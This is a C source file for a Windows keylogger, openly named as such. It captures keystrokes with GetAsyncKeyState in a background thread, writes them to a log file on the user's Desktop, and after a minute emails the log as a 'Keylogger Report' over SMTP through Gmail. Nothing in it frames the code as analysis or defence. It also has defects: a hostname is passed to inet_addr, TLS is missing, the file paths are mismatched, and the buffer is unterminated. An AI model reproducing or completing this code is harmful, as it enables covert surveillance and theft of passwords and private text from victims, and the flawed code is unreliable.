#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <time.h>

#define SMTP_SERVER "smtp.gmail.com"
#define SMTP_PORT 587
#define EMAIL ""
#define PASSWORD ""

void sendMail(char *to, char *subject, char *body) {
    char header[255];

    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    // Create a TCP/IP socket
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in serverAddr;

    // Fill in the address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SMTP_SERVER);
    serverAddr.sin_port = htons(SMTP_PORT);

    // Connect to server
    connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    // Send EHLO command
    sprintf(header, "EHLO %s\r\n", SMTP_SERVER);
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    // Authentication
    sprintf(header, "AUTH LOGIN\r\n");
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    sprintf(header, "%s\r\n", EMAIL);
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    sprintf(header, "%s\r\n", PASSWORD);
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    // Send mail data
    sprintf(header, "MAIL FROM:<%s>\r\n", EMAIL);
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    sprintf(header, "RCPT TO:<%s>\r\n", to);
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    sprintf(header, "DATA\r\n");
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    // Send mail content
    sprintf(header, "To: %s\r\nFrom: %s\r\nSubject: %s\r\n\r\n%s\r\n.\r\n", to, EMAIL, subject, body);
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    // Close connection
    sprintf(header, "QUIT\r\n");
    send(sockfd, header, strlen(header), 0);
    recv(sockfd, header, 255, 0);

    closesocket(sockfd);
    WSACleanup();
}

void logKeys() {
    FILE *file;
    char i;
    char filepath[MAX_PATH];

    // Get the current user's home directory
    TCHAR szPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, szPath);
    strcat(szPath, "\\Desktop\\logs.txt"); // Change the file path as needed

    // Create or open the log file
    file = fopen(szPath, "a");

    // Check if file is successfully opened
    if (file == NULL) {
        exit(EXIT_FAILURE);
    }

    while (1) {
        Sleep(10);

        // Check for alphanumeric keys
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                fputc(i, file);
            }
        }

        // Check for special keys
        if (GetAsyncKeyState(VK_SPACE) == -32767) {
            fputc(' ', file);
        }
        if (GetAsyncKeyState(VK_RETURN) == -32767) {
            fputc('\n', file);
        }
        if (GetAsyncKeyState(VK_SHIFT) == -32767) {
            fputs("[SHIFT]", file);
        }
        if (GetAsyncKeyState(VK_BACK) == -32767) {
            fputs("[BACKSPACE]", file);
        }
    }

    // Close the log file
    fclose(file);
}

int main() {
    // Create a thread to log keystrokes
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKeys, NULL, 0, NULL);

    // Wait for some time before sending email (in milliseconds)
    Sleep(60000); // 1 minute

    // Read the log file and send it via email
    FILE *file;
    char *buffer;
    long fileSize;

    file = fopen("logs.txt", "r");
    if (file) {
        fseek(file, 0, SEEK_END);
        fileSize = ftell(file);
        rewind(file);

        buffer = (char *)malloc(fileSize * sizeof(char));
        fread(buffer, 1, fileSize, file);
        fclose(file);

        sendMail("", "Keylogger Report", buffer);

        free(buffer);
    }

    return 0;
}
